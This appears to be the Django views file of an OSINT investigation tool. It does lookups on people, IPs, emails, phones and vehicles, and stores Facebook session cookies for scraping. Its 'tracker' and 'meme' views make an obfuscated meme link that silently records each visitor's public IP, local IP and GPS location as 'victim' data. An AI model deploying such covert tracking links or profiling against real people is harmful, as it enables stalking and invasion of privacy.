from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import redirect
from django.http import HttpResponseRedirect
from django.contrib.auth.models import User, auth
from django.views.decorators.csrf import csrf_exempt
from .modules.social.facebook import Facebook
from .modules.social.instagram import Instagram
from .modules.social.twitter import Twitter
from .modules.image.reverseimg import reverseImg
from .modules.image.metadata import get_exif
from .modules.social.locmap import loc,heat_map, gps_map
from .modules.ip.ipstack import IPtrace
from .modules.ip.torrenttrack import GetTorrent
from .modules.ip.multipleip import read_multiple_ip
from .modules.phone.phonenum import HLRlookup
from .modules.ip.maclookup import macLookup
from .modules.email.hibp import HaveIbeenPwned
from .modules.email.hunter import hunter
from .modules.email.slideshare import SlideShare
from .modules.domain.webosint import getDomain
from .modules.ip.portscan import DefaultPort
from .modules.ip.censys import censys_ip
from .modules.ip.shodan import shodan_ip
from .modules.btc.btc import btcaddress
from .modules.email.emailrep import emailrep
from .modules.cluster import MakeCluster
from .modules.social.fbkeyword import FacebookScrapper
from .modules.vechile.license import vechileno
from .modules.social.gitscrape import gitscrape

import base64
import sys, os,requests
import pdfx
from io import BufferedReader
import base64, json

sys.path.append("../src")
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def index(request):
  
  if request.method == 'GET':
    return render(request, 'index.html')

  if request.method == 'POST':
    if "search" in request.POST.keys():
          return redirect("/documentation?page=elements#"+request.POST['search'])
        
    username = request.user.username
    user = User.objects.filter(username=username).first()

    ipstackkey = user.profile.ipstackkey
    macapikey = user.profile.macapikey
    hlrlookupkey = user.profile.hlrlookupkey
    hibpkey = user.profile.hibpkey
    hunterkey = user.profile.hunterkey
    googlemapapikey = user.profile.googlemapapikey
    shodankey = user.profile.shodankey
    emailrepkey = user.profile.emailrepkey
    c_user = user.profile.c_user
    xs = user.profile.xs

    query = str(request.POST['query'].replace(" ",""))
    query = query.split(":",1)
    query[0]=query[0].lower()

    if not len(query)<2:

      request_type = str(query[0])
      request_data = str(query[1])

      if request_type == 'facebook':
        return social(request, request_type, request_data, googlemapapikey)

      elif request_type == 'twitter':
        return social(request, request_type, request_data, googlemapapikey)

      elif request_type == 'instagram':
        return social(request, request_type, request_data, googlemapapikey)

      elif request_type == 'github':
        return social(request, request_type, request_data, googlemapapikey)

      elif request_type == 'social':
        return social(request, request_type, request_data, googlemapapikey)

      elif request_type == 'ip':

          ip={}
          ip['ipstackdata']= IPtrace(request_data, ipstackkey)

          portscandata = DefaultPort(request_data)
          if portscandata['Ports'] :
            ip['portscan']=portscandata

          censysdata = censys_ip(request_data)
          if censysdata :
            ip['censys']=censysdata

          shodandata = shodan_ip(request_data,shodankey)
          if 'Error' not in shodandata.keys():
            ip['shodan']=shodandata
          
          lats = ip['ipstackdata']['latitude']
          lons = ip['ipstackdata']['longitude']
          
          ip['gmap3']=heat_map([lats],[lons],googlemapapikey)

          ip['torrentdata'] = GetTorrent(request_data)

          return render(request, 'results.html',{'ip':ip})
        
      elif request_type == 'victimtrack':

        request_data = request_data.split(',')
        pubip = request_data[0]

        ip={}

        if request_data[1].replace('.', '', 1).isdigit() and request_data[2].replace('.', '', 1).isdigit():
          lat = float(request_data[1])
          lon = float(request_data[2])
          ip['gpsmap']=gps_map([lat],[lon],googlemapapikey) #GPS Latitude and Longitude 
        
        ip['ipstackdata']= IPtrace(pubip, ipstackkey)
        iplats = ip['ipstackdata']['latitude']
        iplons = ip['ipstackdata']['longitude']
        
        #ip['gmap3']=heat_map([iplats],[iplons],googlemapapikey) # IP Stack Latitude & Longitude
        
        return render(request, 'results.html',{'ip':ip,'iplats':iplats,'iplons':iplons})

      elif request_type == 'phone':

          hlrdata = HLRlookup(request_data, hlrlookupkey)
          return render(request, 'results.html',{'hlrdata':hlrdata})

      elif request_type == 'mac':
          if len(request_data)==17 and len(request_data.split(":"))==6:
              macdata = macLookup(request_data, macapikey)
              if 'Error' in macdata.keys():
                  return render(request,'results.html',{'Error':macdata['Error']})
              else:
                  return render(request, 'results.html',{'macdata':macdata})
          else:
              return render(request,'index.html',{'error':"Invalid Mac Address"})
      
      elif request_type == 'email':
            hibp=HaveIbeenPwned(request_data,hibpkey)
            hunterio=hunter(request_data,hunterkey)
            emailrepdata=emailrep(request_data,emailrepkey)
            slideshare = SlideShare(request_data)
            return render(request,'results.html',{'hibp':hibp,'hunterio':hunterio,'emailrep':emailrepdata, 'slideshare':slideshare})
     
      elif request_type == 'domain':
            return domain(request,request_data)

      elif request_type == 'cluster':
            jsonurl = MakeCluster(request,request_data.split(","))
            return render(request, 'cluster.html', {'url':jsonurl})
          
      elif request_type == 'btc':
            btc=btcaddress(request_data)
            return render(request,'results.html',{'btc':btc})
          
      elif request_type == 'vehicle':
            vechileinfo=vechileno(request_data)
            return render(request,'results.html',{'vechileinfo':vechileinfo})
          
      elif request_type == 'fbsearch':
            keyword=str(request.POST['query'].split(":")[-1])
            fbsearch=FacebookScrapper(keyword,c_user,xs)
            return render(request,'results.html',{'fbsearch':fbsearch})
    else:
      error = 'The requested Query is INVALID'
      return render(request, 'index.html', {'error':error})

def domain(request,request_data):
      portscan=DefaultPort(request_data)
      return render(request,'domain.html',{"webosint":getDomain(request_data),'portscan':portscan})

def social(request, request_type, request_data, googlemapapikey):

  request_type = request_type
  request_data = request_data

  if request_type == 'facebook':
    fbdata = Facebook(request_data)
    return render(request, 'social.html',{'fbdata':fbdata})

  elif request_type == 'instagram':
      instadata = Instagram(request_data)
      if 'Location' in instadata.keys() and len(instadata['Location']) >0:
          gmap3=loc(instadata['Location'],googlemapapikey)
      else:
          instadata['Location']=None
          gmap3=None
      return render(request, 'social.html',{'instadata':instadata,'gmap3':gmap3})

  elif request_type == 'twitter':

      twitterdata = Twitter(request_data)
      return render(request, 'social.html',{'twitterdata':twitterdata})
    
  elif request_type == 'github':
    
      gitdata = gitscrape(request_data)
      return render(request, 'social.html',{'gitdata':gitdata})
    
  elif request_type == 'social':
      location=list()
      try:
          fbdata = Facebook(request_data)
          if fbdata["Current_city"]:
              location.append(fbdata["Current_city"])
          if fbdata["Home_Town"]:
              location.append(fbdata["Home_Town"])
      except:
          fbdata=None

      instadata = Instagram(request_data)
      if 'Error' not in instadata.keys() and ['Error']!='Profile not found':
          if 'Location' in instadata.keys() and len(instadata['Location'])>0:
              for i in instadata['Location']:
                  location.append(i)
      else:
          instadata=None

      twitterdata = Twitter(request_data)
      if twitterdata!=None:
          if 'location' in twitterdata.keys() and twitterdata['location'] !="Not provided by the user":
              location.append(twitterdata["Location"])
          else:
              pass
      else:
          twitterdata=None

      gitdata = gitscrape(request_data)
    
      if len(location)>0:
          gmap3=loc(location, googlemapapikey)
      else:
          gmap3=None

      return render(request, 'social.html',{'fbdata':fbdata,'instadata':instadata,'twitterdata':twitterdata,
                    'gitdata':gitdata,'gmap3':gmap3})
  else:
    error = 'The requested Query is INVALID'
    return render(request, 'index.html', {'error':error})


def modules(request):
    if request.method=="GET":
        return render(request, 'modules.html')
    elif request.method=="POST":

        username = request.user.username
        user = User.objects.filter(username=username).first()

        if 'input-b2' in request.FILES.keys():
            if request.FILES['input-b2'] != "":
                url=reverseImg(str(request.FILES['input-b2']),request.FILES['input-b2'].file)
                if "https" in url:
                    return redirect(url)
                else:
                    return render(request, 'modules.html',{"Error":url})
            else:
                return render(request, 'modules.html',{"Error":"Do Select the File"})
        
        elif 'metaimage' in request.FILES.keys():
            if request.FILES['metaimage'] != '':
                filename=str(request.FILES['metaimage']).split('.',1)
                if len(filename)==2:
                    if filename[-1] in ['jpg','png','gif','tif','jpeg']:
                        user.profile.metaimage = request.FILES['metaimage']
                        user.profile.save()
                        metaimage = user.profile.metaimage.url
                        googlemapapikey = user.profile.googlemapapikey
                        metadata = get_exif(metaimage)
                        os.remove(BASE_DIR + user.profile.metaimage.url)
                        if 'Error' in metadata.keys():
                            return render(request, 'results.html',{'metadata':metadata})
                        elif 'Latitude' in metadata.keys():
                            lats = metadata['Latitude']
                            lons = metadata['Longitude']
                            gmap3=heat_map([lats],[lons], googlemapapikey)
                            return render(request, 'results.html',{'metadata':metadata, 'gmap3':gmap3})
                        else:
                            return render(request, 'results.html',{'metadata':metadata})
                    elif filename[-1] == 'pdf':
                        user.profile.metaimage = request.FILES['metaimage']
                        user.profile.save()
                        pdf=pdfx.PDFx(BASE_DIR + user.profile.metaimage.url)
                        os.remove(BASE_DIR + user.profile.metaimage.url)
                        metadata=pdf.get_metadata()
                        metadata['references_dict'] = pdf.get_references_as_dict()
                        return render(request, 'results.html',{'metadata':metadata})
                    else:
                        return render(request, 'modules.html',{"Error":"Upload a filename with Valid Extension"})
                else:
                    return render(request, 'modules.html',{"Error":"Select Module and File Properly"})
            else:
                return render(request, 'modules.html',{"Error":"Something Went Wrong"})
        
        elif 'input-b1' in request.FILES.keys():
            if request.FILES['input-b1'] != "":
                ipstackkey = user.profile.ipstackkey
                gmap3=read_multiple_ip(request.FILES['input-b1'].file,ipstackkey)
                return render(request, 'results.html',{'gmap3':gmap3})
            else:
                return render(request, 'modules.html',{"Error":"Do Select the File"})
        else:
            return render(request, 'modules.html',{"Error":"Select Module and File Properly"})

def documentation(request):
  if request.method=="GET":
    try:
      page=request.GET['page']
      if page == "start":
        return render(request, 'doc/start.html')
      elif page == "elements":
        return render(request, 'doc/elements.html')
      elif page == "license":
        return render(request, 'doc/license.html')
      elif page == "tracker":
        return render(request, 'doc/trackerinfo.html')
      elif page == "faq":
        return render(request, 'doc/faq.html')
      elif page == "credits":
        return render(request, 'doc/credits.html')
      else:
        pass  
    except:
      pass
  return render(request, 'doc/documentation.html')

def settings(request):

  if request.method == 'GET':
   return render(request, 'settings.html')

  if request.method == 'POST':
    username = request.user.username
    user = User.objects.filter(username=username).first()
    if "exportjson" in request.POST.keys():
      attr=list(request.POST.keys())
      jsonexport="{"
      print(attr[5:])
      for keys in attr[5:]:
        #exec("print(user.profile."+keys+");")
        jsonexport+="\""+keys+"\""+":"+"\""+request.POST[keys].encode().decode('utf-8')+"\""+","
      jsonexport+="}"
      filename = str(user)+'_exportkeys.json'
      response = HttpResponse(jsonexport,content_type='application/json')
      response['Content-Length'] = len(response.content)
      response['Content-Disposition'] = 'attachment; filename='+str(filename)
      #response['X-Sendfile'] = filename
      return response
    elif "importjson" in request.FILES.keys():
      file=str(request.FILES['importjson']).split(".")
      if len(file) == 2 and file[-1]=="json":
          with BufferedReader(request.FILES['importjson']) as f:
            jsoncontent=f.read().decode("utf-8").replace(",}","}")
          jsoncontent=json.loads(jsoncontent)
          for keys in jsoncontent.keys():
            attr=list(request.POST.keys())
            if keys not in attr[3:]:
              return render(request, 'settings.html',{"Error":"File with Unknown Key"})
          for keys in attr[3:]:
            if keys == "hibpkey":
              user.profile.hibpkey=jsoncontent['hibpkey']
                            
            elif keys == "hunterkey":
              user.profile.hibpkey=jsoncontent['hunterkey']
              
            elif 'hlrlookupkey' == keys:
              user.profile.hlrlookupkey = jsoncontent['hlrlookupkey']
              
            elif 'googlemapapikey' == keys:
              user.profile.googlemapapikey = jsoncontent['googlemapapikey']

            elif 'macapikey' == keys:
              user.profile.macapikey = jsoncontent['macapikey']

            elif 'ipstackkey' == keys:
              user.profile.ipstackkey = jsoncontent['ipstackkey']

            elif 'virustotalkey' == keys:
              user.profile.virustotalkey = jsoncontent['virustotalkey']
                  
            elif 'shodankey' == keys:
                  user.profile.shodankey = jsoncontent['shodankey']
                  
            elif 'emailrepkey' == keys:
                  user.profile.emailrepkey = jsoncontent['emailrepkey']
                  
            elif 'c_user' == keys:
                  user.profile.c_user = jsoncontent['c_user']

            elif 'xs' == keys:
                  user.profile.xs = jsoncontent['xs']
          user.profile.save()
          return render(request, 'settings.html')
      else: 
          return render(request, 'settings.html',{"Error":"Unknown File format"})
        
    darkmode = request.POST['darkmode']
    if darkmode == 'true':
      user.profile.darkmode = True

    else:
      user.profile.darkmode = False
    
    if request.POST['hibpkey'] != '':
      user.profile.hibpkey = request.POST['hibpkey']
      
    if request.POST['hunterkey']!= '':
        user.profile.hunterkey = request.POST['hunterkey']

    if request.POST['hlrlookupkey'] != '':
      user.profile.hlrlookupkey = request.POST['hlrlookupkey']

    if request.POST['googlemapapikey'] != '':
      user.profile.googlemapapikey = request.POST['googlemapapikey']

    if request.POST['macapikey'] != '':
      user.profile.macapikey = request.POST['macapikey']

    if request.POST['ipstackkey'] != '':
      user.profile.ipstackkey = request.POST['ipstackkey']

    if request.POST['virustotalkey'] != '':
      user.profile.virustotalkey = request.POST['virustotalkey']
          
    if request.POST['shodankey'] != '':
          user.profile.shodankey = request.POST['shodankey']
          
    if request.POST['emailrepkey'] != '':
          user.profile.emailrepkey = request.POST['emailrepkey']
          
    if request.POST['c_user'] != '':
          user.profile.c_user = request.POST['c_user']

    if request.POST['xs'] != '':
          user.profile.xs = request.POST['xs']

    user.profile.save()
    return render(request, 'settings.html')
  
@csrf_exempt
def meme(request, username):
  secret=str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a','=')
  secret=base64.b64decode(secret)
  secret=secret.decode('ascii')
  secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+23)%36] for c in secret])
  
  if request.method == 'GET':
    return render(request, 'meme'+secret[-1]+'.html')

  elif request.method == 'POST':
    username = username
    localip = str(request.POST.get('locip'))
    viclatitude = str(request.POST.get('latitude'))
    viclongitude = str(request.POST.get('longitude'))
  

    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

    if x_forwarded_for:
        publicip = str(x_forwarded_for.split(',')[0])
    else:
        publicip = str(request.META.get('REMOTE_ADDR'))
    user = User.objects.filter(username=secret[:-1]).first()

    if user.profile.victimpublicip == '' : # Assigning values for the first time
      user.profile.victimpublicip = publicip
      user.profile.victimlocip = localip
      user.profile.victimlatitude = viclatitude
      user.profile.victimlongitude = viclongitude

    elif publicip not in user.profile.victimpublicip or localip not in user.profile.victimlocip:

      if publicip not in user.profile.victimpublicip: #Checking whether the Public Ip already exists in DB
        user.profile.victimpublicip += ','+publicip # Appending values from 2nd time
        user.profile.victimlocip += ','+localip
        user.profile.victimlatitude += ','+viclatitude
        user.profile.victimlongitude += ','+viclongitude

      else:
        pass

    user.profile.save()
    return render(request, 'meme'+secret[-1]+'.html')

def tracker(request):

  if request.method == 'GET':
    GET = {
		"request_type" : 'GET'
	  }
    return render(request, 'tracker.html',{'get':GET})

  if request.method == 'POST':
    username = request.user.username
    user = User.objects.filter(username=username).first()
    try:
      if request.POST['flush'] == "Confirm":
        user.profile.victimlatitude=""
        user.profile.victimlocip=""
        user.profile.victimpublicip=""
        user.profile.victimlongitude=""
        user.save()
        return redirect("tracker")
      else:
        pass
    except:
      pass
    secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+13)%36] for c in str(username+request.POST['template'])])
    secret=base64.b64encode(str(secret).encode('ascii'))
    if "=" in str(secret.decode('ascii')):
          secret=str(secret.decode('ascii')).replace('=','a')
    url = "https://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)

    # Fetching values from DB as list
    
    victimpublicip = user.profile.victimpublicip
    victimpublicip = victimpublicip.split(",")
    
    victimlocip = user.profile.victimlocip
    victimlocip = victimlocip.split(",")

    viclatitude = user.profile.victimlatitude
    viclatitude = viclatitude.split(",")

    viclongitude = user.profile.victimlongitude
    viclongitude = viclongitude.split(",")
    victim=[]
    for i in range(len(viclatitude)):
      victim.append([victimpublicip[i],victimlocip[i],viclatitude[i],viclongitude[i]])

    if victimpublicip != ['']:
      return render(request, 'tracker.html', {'victim':victim,'url':url})
    else:
      return render(request, 'tracker.html', {'url':url})

def logout(request):

  auth.logout(request)
  return HttpResponseRedirect("login")

def login(request):

  if request.method == 'GET':
   return render(request, 'login.html')

  if request.method == 'POST':

    text = request.POST['policeid']

    password = request.POST['password']

    user = auth.authenticate(username=text, password=password)

    if user is not None:
      auth.login(request, user)
      #return render(request, 'dashboard.html', {'user':text})
      return redirect('index')

    else:
      return render(request, 'login.html', {'Auth':'False'})

def bad_request_error(request,exception):
  return render(request, 'Error400.html',status=400) 
  
def forbidden(request,exception):
  return render(request, 'Error403.html',status=403) 
  
def page_not_found(request,exception):
  return render(request, 'Error404.html', status=404)
  
def server_error(request):
  return render(request, 'Error500.html', status=500)